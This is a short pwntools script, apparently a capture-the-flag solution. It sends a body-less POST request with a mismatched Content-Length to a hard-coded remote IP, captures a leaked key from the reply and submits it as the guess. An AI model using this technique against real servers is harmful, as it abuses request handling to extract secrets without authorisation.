from pwn import *

r = remote("31.22.123.49", 1905)

dat = '''POST / HTTP/1.1\r
Content-Length: 26\r
\r
'''
r.send(dat)
r.recvuntil("guessed: ")
key = r.recvuntil("</p>", drop=True)
r.sendline("guess=" + key)

r.interactive()